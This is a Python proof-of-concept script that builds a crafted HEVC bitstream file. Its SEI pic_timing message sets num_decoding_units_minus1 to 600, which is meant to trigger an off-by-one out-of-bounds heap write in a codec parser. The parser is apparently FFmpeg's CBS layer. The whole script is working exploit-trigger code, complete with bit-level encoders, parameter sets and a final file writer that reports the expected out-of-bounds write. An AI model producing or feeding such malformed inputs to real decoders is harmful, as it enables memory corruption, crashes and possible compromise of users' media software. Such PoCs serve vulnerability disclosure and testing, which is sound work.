#!/usr/bin/env python3
"""
PoC generator for VULN-001: Off-by-One OOB Heap Write in HEVC CBS sei_pic_timing
via num_decoding_units_minus1=600 (HEVC_MAX_SLICE_SEGMENTS).

Constructs a minimal HEVC Annex-B bitstream with:
  - VPS
  - SPS with VUI HRD params: sub_pic_hrd_params_present_flag=1,
    sub_pic_cpb_params_in_pic_timing_sei_flag=1
  - PPS
  - Prefix SEI NAL with pic_timing payload where
    num_decoding_units_minus1=600 -> loop accesses index 600 (OOB)
"""

import struct
import sys
import os


class BitWriter:
    """Bit-level writer for HEVC RBSP content."""

    def __init__(self):
        self._bits = []

    def write_bits(self, value, n):
        """Write n bits of value (MSB first)."""
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_ue(self, value):
        """Write UE-Golomb code for value."""
        if value == 0:
            self._bits.append(1)
            return
        v = value + 1
        nbits = v.bit_length()  # number of bits in v
        prefix_zeros = nbits - 1
        for _ in range(prefix_zeros):
            self._bits.append(0)
        self._bits.append(1)
        for i in range(nbits - 2, -1, -1):
            self._bits.append((v >> i) & 1)

    def write_se(self, value):
        """Write SE-Golomb code for value."""
        if value > 0:
            ue_val = 2 * value - 1
        else:
            ue_val = -2 * value
        self.write_ue(ue_val)

    def write_flag(self, value):
        self._bits.append(1 if value else 0)

    def write_u8(self, value):
        self.write_bits(value & 0xFF, 8)

    def write_rbsp_trailing_bits(self):
        """Append stop bit (1) and zero-fill to byte boundary."""
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)

    def to_bytes(self):
        """Convert bits to bytes, padding with 0 if not byte-aligned."""
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)


def apply_emulation_prevention(data: bytes) -> bytes:
    """
    Insert emulation prevention byte (0x03) when 0x00 0x00 0x00,
    0x00 0x00 0x01, or 0x00 0x00 0x02 would appear in the NAL payload.
    """
    result = bytearray()
    zero_count = 0
    for byte in data:
        if zero_count >= 2 and byte <= 0x03:
            result.append(0x03)
            zero_count = 0
        if byte == 0x00:
            zero_count += 1
        else:
            zero_count = 0
        result.append(byte)
    return bytes(result)


def make_nal(nal_unit_type: int, rbsp: bytes) -> bytes:
    """
    Create Annex-B NAL unit:
      [0x00 0x00 0x00 0x01] [header byte 0] [header byte 1] [payload with EPB]
    NAL header format (16 bits):
      forbidden_zero_bit(1) | nal_unit_type(6) | nuh_layer_id(6) | nuh_temporal_id_plus1(3)
    We use layer_id=0, temporal_id_plus1=1.
    """
    layer_id = 0
    temporal_id_plus1 = 1
    hdr0 = (0 << 7) | (nal_unit_type << 1) | (layer_id >> 5)
    hdr1 = ((layer_id & 0x1F) << 3) | temporal_id_plus1

    header = bytes([hdr0, hdr1])
    payload_with_epb = apply_emulation_prevention(rbsp)
    return b'\x00\x00\x00\x01' + header + payload_with_epb


# ─── Profile Tier Level ───────────────────────────────────────────────────────

def write_profile_tier_level(bw: BitWriter, profile_present_flag: int,
                              max_num_sub_layers_minus1: int):
    """Write profile_tier_level() syntax."""
    if profile_present_flag:
        # general_profile_space = 0 (2 bits)
        bw.write_bits(0, 2)
        # general_tier_flag = 0
        bw.write_flag(0)
        # general_profile_idc = 1 (Main profile, 5 bits)
        bw.write_bits(1, 5)
        # general_profile_compatibility_flag[32]: bit[1]=1, rest=0
        for j in range(32):
            bw.write_flag(1 if j == 1 else 0)
        # general_progressive_source_flag = 1
        bw.write_flag(1)
        # general_interlaced_source_flag = 0
        bw.write_flag(0)
        # general_non_packed_constraint_flag = 0
        bw.write_flag(0)
        # general_frame_only_constraint_flag = 1
        bw.write_flag(1)
        # profile_idc=1 is not in {4,5,6,7,8,9,10,11} or {2}
        # so: general_reserved_zero_43bits (43 bits)
        bw.write_bits(0, 43)
        # profile_idc=1 IS in {1,2,3,4,5,9,11}: general_inbld_flag = 0
        bw.write_flag(0)

    # general_level_idc = 93 (Level 3.1)
    bw.write_bits(93, 8)

    # Sub-layer flags (0 if max_num_sub_layers_minus1 == 0)
    for i in range(max_num_sub_layers_minus1):
        bw.write_flag(0)  # sub_layer_profile_present_flag[i]
        bw.write_flag(0)  # sub_layer_level_present_flag[i]

    if max_num_sub_layers_minus1 > 0:
        for i in range(max_num_sub_layers_minus1, 8):
            bw.write_bits(0, 2)  # reserved_zero_2bits

    # No sub-layer profile/level data since all flags are 0


# ─── HRD Parameters ──────────────────────────────────────────────────────────

def write_sub_layer_hrd_parameters(bw: BitWriter, sub_pic_hrd_params_present: int,
                                    cpb_cnt_minus1: int):
    """Write sub_layer_hrd_parameters() for cpb_cnt_minus1+1 CPBs."""
    for i in range(cpb_cnt_minus1 + 1):
        bw.write_ue(0)   # bit_rate_value_minus1[i]
        bw.write_ue(0)   # cpb_size_value_minus1[i]
        if sub_pic_hrd_params_present:
            bw.write_ue(0)   # cpb_size_du_value_minus1[i]
            bw.write_ue(0)   # bit_rate_du_value_minus1[i]
        bw.write_flag(0)  # cbr_flag[i]


def write_hrd_parameters(bw: BitWriter, common_inf_present_flag: int,
                          max_num_sub_layers_minus1: int,
                          nal_hrd_present: int = 1,
                          vcl_hrd_present: int = 0,
                          sub_pic_hrd_params_present: int = 1,
                          sub_pic_cpb_params_in_pic_timing_sei: int = 1):
    """Write hrd_parameters() syntax."""
    if common_inf_present_flag:
        bw.write_flag(nal_hrd_present)   # nal_hrd_parameters_present_flag
        bw.write_flag(vcl_hrd_present)   # vcl_hrd_parameters_present_flag

        if nal_hrd_present or vcl_hrd_present:
            bw.write_flag(sub_pic_hrd_params_present)  # sub_pic_hrd_params_present_flag
            if sub_pic_hrd_params_present:
                bw.write_bits(0, 8)   # tick_divisor_minus2
                bw.write_bits(0, 5)   # du_cpb_removal_delay_increment_length_minus1 (0 → length=1)
                bw.write_flag(sub_pic_cpb_params_in_pic_timing_sei)
                bw.write_bits(0, 5)   # dpb_output_delay_du_length_minus1 (0 → length=1)

            bw.write_bits(0, 4)  # bit_rate_scale
            bw.write_bits(0, 4)  # cpb_size_scale
            if sub_pic_hrd_params_present:
                bw.write_bits(0, 4)  # cpb_size_du_scale

            bw.write_bits(0, 5)  # initial_cpb_removal_delay_length_minus1 (0 → length=1)
            bw.write_bits(0, 5)  # au_cpb_removal_delay_length_minus1 (0 → length=1)
            bw.write_bits(0, 5)  # dpb_output_delay_length_minus1 (0 → length=1)

    for i in range(max_num_sub_layers_minus1 + 1):
        bw.write_flag(0)  # fixed_pic_rate_general_flag[i] = 0
        # fixed_pic_rate_general_flag=0 → write fixed_pic_rate_within_cvs_flag
        bw.write_flag(0)  # fixed_pic_rate_within_cvs_flag[i] = 0
        # fixed_pic_rate_within_cvs_flag=0 → write low_delay_hrd_flag
        bw.write_flag(0)  # low_delay_hrd_flag[i] = 0
        # low_delay_hrd_flag=0 → write cpb_cnt_minus1
        bw.write_ue(0)    # cpb_cnt_minus1[i] = 0 (1 CPB)

        if nal_hrd_present:
            write_sub_layer_hrd_parameters(bw, sub_pic_hrd_params_present, 0)
        if vcl_hrd_present:
            write_sub_layer_hrd_parameters(bw, sub_pic_hrd_params_present, 0)


# ─── VUI Parameters ──────────────────────────────────────────────────────────

def write_vui_parameters(bw: BitWriter, sps_max_sub_layers_minus1: int):
    """Write vui_parameters() with HRD sub-pic params enabled."""
    bw.write_flag(0)  # aspect_ratio_info_present_flag
    bw.write_flag(0)  # overscan_info_present_flag
    bw.write_flag(0)  # video_signal_type_present_flag
    bw.write_flag(0)  # chroma_loc_info_present_flag
    bw.write_flag(0)  # neutral_chroma_indication_flag
    bw.write_flag(0)  # field_seq_flag
    bw.write_flag(0)  # frame_field_info_present_flag
    bw.write_flag(0)  # default_display_window_flag

    bw.write_flag(1)  # vui_timing_info_present_flag
    bw.write_bits(1, 32)   # vui_num_units_in_tick = 1
    bw.write_bits(25, 32)  # vui_time_scale = 25
    bw.write_flag(0)  # vui_poc_proportional_to_timing_flag

    bw.write_flag(1)  # vui_hrd_parameters_present_flag
    write_hrd_parameters(bw,
                         common_inf_present_flag=1,
                         max_num_sub_layers_minus1=sps_max_sub_layers_minus1,
                         nal_hrd_present=1,
                         vcl_hrd_present=0,
                         sub_pic_hrd_params_present=1,
                         sub_pic_cpb_params_in_pic_timing_sei=1)

    bw.write_flag(0)  # bitstream_restriction_flag


# ─── VPS ─────────────────────────────────────────────────────────────────────

def build_vps() -> bytes:
    bw = BitWriter()
    # nal_unit_header is written by make_nal(); here we write RBSP body.
    # After the 2-byte NAL header consumed by make_nal, the parser calls
    # FUNC(nal_unit_header) which re-reads the header from the bitstream.
    # So the RBSP body starts with the NAL header bits too.

    # nal_unit_header (16 bits): type=32, layer_id=0, temporal_id_plus1=1
    bw.write_bits(0, 1)   # forbidden_zero_bit
    bw.write_bits(32, 6)  # nal_unit_type
    bw.write_bits(0, 6)   # nuh_layer_id
    bw.write_bits(1, 3)   # nuh_temporal_id_plus1

    # vps body
    bw.write_bits(0, 4)   # vps_video_parameter_set_id = 0
    bw.write_flag(1)      # vps_base_layer_internal_flag
    bw.write_flag(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)   # vps_max_layers_minus1 = 0
    bw.write_bits(0, 3)   # vps_max_sub_layers_minus1 = 0
    bw.write_flag(1)      # vps_temporal_id_nesting_flag = 1 (required when sub_layers=0)
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits

    write_profile_tier_level(bw, profile_present_flag=1, max_num_sub_layers_minus1=0)

    bw.write_flag(0)   # vps_sub_layer_ordering_info_present_flag
    # Loop i = max_sub_layers_minus1 = 0 to 0:
    bw.write_ue(1)     # vps_max_dec_pic_buffering_minus1[0] = 1
    bw.write_ue(0)     # vps_max_num_reorder_pics[0] = 0
    bw.write_ue(0)     # vps_max_latency_increase_plus1[0] = 0

    bw.write_bits(0, 6)   # vps_max_layer_id = 0
    bw.write_ue(0)        # vps_num_layer_sets_minus1 = 0
    # No layer_id_included_flag loops (starts at i=1)

    bw.write_flag(0)   # vps_timing_info_present_flag
    bw.write_flag(0)   # vps_extension_flag

    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


# ─── SPS ─────────────────────────────────────────────────────────────────────

def build_sps() -> bytes:
    bw = BitWriter()

    # nal_unit_header: type=33
    bw.write_bits(0, 1)
    bw.write_bits(33, 6)
    bw.write_bits(0, 6)
    bw.write_bits(1, 3)

    # sps_video_parameter_set_id = 0 (references VPS 0)
    bw.write_bits(0, 4)
    # nuh_layer_id=0 so:
    bw.write_bits(0, 3)   # sps_max_sub_layers_minus1 = 0
    bw.write_flag(1)      # sps_temporal_id_nesting_flag = 1

    write_profile_tier_level(bw, profile_present_flag=1, max_num_sub_layers_minus1=0)

    bw.write_ue(0)   # sps_seq_parameter_set_id = 0

    # Not multi_layer_ext_sps:
    bw.write_ue(1)   # chroma_format_idc = 1 (4:2:0)
    # separate_colour_plane_flag not written (chroma_format_idc != 3)

    bw.write_ue(64)  # pic_width_in_luma_samples = 64 (divisible by 16)
    bw.write_ue(64)  # pic_height_in_luma_samples = 64 (divisible by 16)

    bw.write_flag(0)  # conformance_window_flag

    bw.write_ue(0)   # bit_depth_luma_minus8 = 0
    bw.write_ue(0)   # bit_depth_chroma_minus8 = 0

    bw.write_ue(0)   # log2_max_pic_order_cnt_lsb_minus4 = 0

    bw.write_flag(0)  # sps_sub_layer_ordering_info_present_flag
    # Loop i = sps_max_sub_layers_minus1 = 0:
    bw.write_ue(1)   # sps_max_dec_pic_buffering_minus1[0] = 1
    bw.write_ue(0)   # sps_max_num_reorder_pics[0] = 0
    bw.write_ue(0)   # sps_max_latency_increase_plus1[0] = 0

    # log2_min_luma_coding_block_size_minus3 = 1 (min_cb_log2=4, min_cb_size=16)
    bw.write_ue(1)
    # log2_diff_max_min_luma_coding_block_size = 2 (ctb_log2=6, CTB=64)
    bw.write_ue(2)
    # Check: 64 % 16 = 0 OK, CTB size = 64 (valid for HEVC Main profile)

    # log2_min_luma_transform_block_size_minus2 = 0 (min_tb_log2=2)
    # range: [0, min_cb_log2_size_y - 3] = [0, 1]
    bw.write_ue(0)
    # log2_diff_max_min_luma_transform_block_size = 0
    # range: [0, FFMIN(ctb=6, 5) - min_tb_log2=2] = [0, 3]
    bw.write_ue(0)

    # max_transform_hierarchy_depth_inter = 0
    # range: [0, ctb_log2_size_y - min_tb_log2_size_y] = [0, 6-2=4]
    bw.write_ue(0)
    # max_transform_hierarchy_depth_intra = 0
    bw.write_ue(0)

    bw.write_flag(0)  # scaling_list_enabled_flag
    bw.write_flag(0)  # amp_enabled_flag
    bw.write_flag(0)  # sample_adaptive_offset_enabled_flag
    bw.write_flag(0)  # pcm_enabled_flag

    bw.write_ue(0)   # num_short_term_ref_pic_sets = 0

    bw.write_flag(0)  # long_term_ref_pics_present_flag
    bw.write_flag(0)  # sps_temporal_mvp_enabled_flag
    bw.write_flag(0)  # strong_intra_smoothing_enabled_flag

    bw.write_flag(1)  # vui_parameters_present_flag
    write_vui_parameters(bw, sps_max_sub_layers_minus1=0)

    bw.write_flag(0)  # sps_extension_present_flag

    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


# ─── PPS ─────────────────────────────────────────────────────────────────────

def build_pps() -> bytes:
    bw = BitWriter()

    # nal_unit_header: type=34
    bw.write_bits(0, 1)
    bw.write_bits(34, 6)
    bw.write_bits(0, 6)
    bw.write_bits(1, 3)

    bw.write_ue(0)   # pps_pic_parameter_set_id = 0
    bw.write_ue(0)   # pps_seq_parameter_set_id = 0

    bw.write_flag(0)    # dependent_slice_segments_enabled_flag
    bw.write_flag(0)    # output_flag_present_flag
    bw.write_bits(0, 3) # num_extra_slice_header_bits
    bw.write_flag(0)    # sign_data_hiding_enabled_flag
    bw.write_flag(0)    # cabac_init_present_flag

    bw.write_ue(0)   # num_ref_idx_l0_default_active_minus1 = 0
    bw.write_ue(0)   # num_ref_idx_l1_default_active_minus1 = 0

    # init_qp_minus26: SE(0), range [-(26+0), 25]
    bw.write_se(0)

    bw.write_flag(0)  # constrained_intra_pred_flag
    bw.write_flag(0)  # transform_skip_enabled_flag
    bw.write_flag(0)  # cu_qp_delta_enabled_flag
    # diff_cu_qp_delta_depth not written (cu_qp_delta=0)

    # pps_cb_qp_offset: SE(0)
    bw.write_se(0)
    # pps_cr_qp_offset: SE(0)
    bw.write_se(0)

    bw.write_flag(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_flag(0)  # weighted_pred_flag
    bw.write_flag(0)  # weighted_bipred_flag
    bw.write_flag(0)  # transquant_bypass_enabled_flag
    bw.write_flag(0)  # tiles_enabled_flag
    bw.write_flag(0)  # entropy_coding_sync_enabled_flag

    bw.write_flag(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_flag(0)  # deblocking_filter_control_present_flag
    bw.write_flag(0)  # pps_scaling_list_data_present_flag
    bw.write_flag(0)  # lists_modification_present_flag

    # log2_parallel_merge_level_minus2: UE(0)
    # range [0, (1+3+2-2)] = [0, 4] (with min_cb_log2_minus3=1, log2_diff=2)
    bw.write_ue(0)

    bw.write_flag(0)  # slice_segment_header_extension_present_flag
    bw.write_flag(0)  # pps_extension_present_flag

    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


# ─── SEI pic_timing ──────────────────────────────────────────────────────────

def build_sei_pic_timing_payload() -> bytes:
    """
    Build the RBSP payload bytes for a pic_timing SEI.
    SPS settings assumed:
      frame_field_info_present_flag = 0 (no pic_struct/source_scan_type/dup)
      vui_hrd_parameters_present_flag = 1
      nal_hrd_parameters_present_flag = 1
      au_cpb_removal_delay_length_minus1 = 0 (length = 1 bit)
      dpb_output_delay_length_minus1 = 0 (length = 1 bit)
      sub_pic_hrd_params_present_flag = 1
      dpb_output_delay_du_length_minus1 = 0 (length = 1 bit)
      sub_pic_cpb_params_in_pic_timing_sei_flag = 1
      du_cpb_removal_delay_increment_length_minus1 = 0 (length = 1 bit)
    """
    bw = BitWriter()

    # No pic_struct/source_scan_type/duplicate_flag (frame_field_info_present=0)

    # au_cpb_removal_delay_minus1 (1 bit, length=au_cpb_removal_delay_length_minus1+1=1)
    bw.write_bits(0, 1)

    # pic_dpb_output_delay (1 bit)
    bw.write_bits(0, 1)

    # sub_pic_hrd_params_present_flag=1:
    # pic_dpb_output_du_delay (1 bit, length=dpb_output_delay_du_length_minus1+1=1)
    bw.write_bits(0, 1)

    # sub_pic_cpb_params_in_pic_timing_sei_flag=1:
    # num_decoding_units_minus1 = 600 (UE-Golomb)
    # 600+1=601=0b1001011001 (10 bits), so 9 zeros + 1 + 001011001
    bw.write_ue(600)  # <-- triggers OOB: loop runs i=0..600, writes to index 600 (OOB!)

    # du_common_cpb_removal_delay_flag = 1 (simplifies payload)
    bw.write_flag(1)

    # du_common_cpb_removal_delay_increment_minus1 (1 bit, length=1)
    bw.write_bits(0, 1)

    # Loop i=0..600 (601 iterations):
    # num_nalus_in_du_minus1[i] = UE(0) = "1" (1 bit each)
    # No du_cpb_removal_delay_increment_minus1 since du_common=1
    for i in range(601):
        bw.write_ue(0)  # num_nalus_in_du_minus1[i] = 0

    # NO rbsp_trailing_bits for SEI payload content (it's inside a container)
    return bw.to_bytes()


def build_prefix_sei_nal() -> bytes:
    """
    Build a Prefix SEI NAL unit (type=39) containing a pic_timing SEI payload.
    """
    bw_nal = BitWriter()

    # nal_unit_header: type=39 (PREFIX_SEI_NUT)
    bw_nal.write_bits(0, 1)
    bw_nal.write_bits(39, 6)
    bw_nal.write_bits(0, 6)
    bw_nal.write_bits(1, 3)

    # SEI message: payloadType=1 (pic_timing)
    payload = build_sei_pic_timing_payload()
    payload_size = len(payload)

    # payloadType encoding: 1 → single byte 0x01
    bw_nal.write_bits(1, 8)  # payloadType = 1

    # payloadSize encoding
    remaining = payload_size
    while remaining >= 255:
        bw_nal.write_bits(0xFF, 8)
        remaining -= 255
    bw_nal.write_bits(remaining, 8)

    # Flush current bits to bytes before appending payload
    # We need to be byte-aligned at this point (we are after writing the header)
    assert len(bw_nal._bits) % 8 == 0, "SEI header should be byte-aligned"

    nal_header_bytes = bw_nal.to_bytes()

    # Combine: NAL header bits + payload bytes
    # The SEI payload bytes are raw RBSP content
    rbsp = nal_header_bytes + payload

    # rbsp_trailing_bits at end of SEI NAL
    # Append stop bit + zero padding
    trailing = bytearray()
    # We need to add rbsp_trailing_bits as part of the RBSP
    # The SEI RBSP ends with rbsp_trailing_bits after all SEI messages
    trailing.append(0x80)  # 1 followed by 7 zeros (byte-aligned stop bit)
    rbsp = rbsp + bytes(trailing)

    return rbsp


# ─── IDR Slice (minimal) ─────────────────────────────────────────────────────

def build_idr_slice() -> bytes:
    """
    Build a minimal IDR_W_RADL slice NAL unit header (type=19).
    The slice header is byte-aligned with just enough fields for CBS to accept it.
    With our PPS settings:
      - first_slice_segment_in_pic_flag=1
      - no_output_of_prior_pics_flag=0  (present for IRAP NALs)
      - slice_pic_parameter_set_id=0    (UE=1 bit "1")
      - slice_type=2 (I-slice)          (UE(2)=3 bits "011")
      - slice_qp_delta=0                (SE(0)=1 bit "1")
      - byte_alignment stop bit         (1 bit "1")
    Total bits after NAL header (16 bits): 1+1+1+3+1+1 = 8 bits → 1 byte → total 3 bytes RBSP
    """
    bw = BitWriter()

    # nal_unit_header: type=19 (IDR_W_RADL)
    bw.write_bits(0, 1)   # forbidden_zero_bit
    bw.write_bits(19, 6)  # nal_unit_type
    bw.write_bits(0, 6)   # nuh_layer_id
    bw.write_bits(1, 3)   # nuh_temporal_id_plus1

    # first_slice_segment_in_pic_flag = 1
    bw.write_flag(1)

    # no_output_of_prior_pics_flag = 0 (present for IRAP NAL types)
    bw.write_flag(0)

    # slice_pic_parameter_set_id = 0 (UE(0) = "1")
    bw.write_ue(0)

    # Since first_slice → no address, dependent inferred 0
    # Not dependent → write header fields:
    #   No slice_reserved_flags (num_extra=0)
    #   slice_type = 2 (I-type) UE(2) = "011"
    bw.write_ue(2)  # slice_type = I

    # Skip non-IDR block (this IS IDR)
    # sps_temporal_mvp_enabled_flag=0 → infer slice_temporal_mvp=0
    # sample_adaptive_offset=0 → infer SAO flags=0,0
    # slice_type=I → skip P/B ref lists

    # slice_qp_delta = 0 (SE(0) = "1")
    # Range: -26 to +25 (with bit_depth_luma_minus8=0, init_qp_minus26=0)
    bw.write_se(0)

    # All other fields are inferred (no deblocking override, no tiles, etc.)

    # byte_alignment: stop bit + zeros to byte boundary
    bw.write_rbsp_trailing_bits()

    return bw.to_bytes()


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_file = os.path.join(out_dir, 'vuln_001_input.h265')

    vps_rbsp   = build_vps()
    sps_rbsp   = build_sps()
    pps_rbsp   = build_pps()
    sei_rbsp   = build_prefix_sei_nal()
    idr_rbsp   = build_idr_slice()

    # In CBS / Annex B:
    # [start_code][NAL_data_with_EPB]
    # The NAL data already includes the 2-byte NAL unit header at the start,
    # followed by the RBSP body. We include the NAL header in each build_* function.
    def make_annex_b_nal(rbsp_with_header: bytes) -> bytes:
        """Create Annex-B NAL: start code + data with emulation prevention bytes."""
        return b'\x00\x00\x00\x01' + apply_emulation_prevention(rbsp_with_header)

    # Build the bitstream:
    # VPS, SPS, PPS → typically go into codec extradata
    # SEI, IDR → form the first access unit (packet)
    # The SEI must come before IDR in the access unit.
    # When trace_headers BSF receives the packet [SEI][IDR]:
    #   CBS processes SEI → OOB write at num_nalus_in_du_minus1[600]!
    bitstream = (
        make_annex_b_nal(vps_rbsp) +
        make_annex_b_nal(sps_rbsp) +
        make_annex_b_nal(pps_rbsp) +
        make_annex_b_nal(sei_rbsp) +
        make_annex_b_nal(idr_rbsp)
    )

    with open(out_file, 'wb') as f:
        f.write(bitstream)

    print(f"[+] Generated {out_file} ({len(bitstream)} bytes)")
    print(f"    VPS RBSP:  {len(vps_rbsp)} bytes")
    print(f"    SPS RBSP:  {len(sps_rbsp)} bytes")
    print(f"    PPS RBSP:  {len(pps_rbsp)} bytes")
    print(f"    SEI RBSP:  {len(sei_rbsp)} bytes")
    print(f"    IDR RBSP:  {len(idr_rbsp)} bytes")
    print(f"[+] SEI pic_timing has num_decoding_units_minus1=600")
    print(f"[+] OOB write expected at num_nalus_in_du_minus1[600] (array size=600)")


if __name__ == '__main__':
    main()
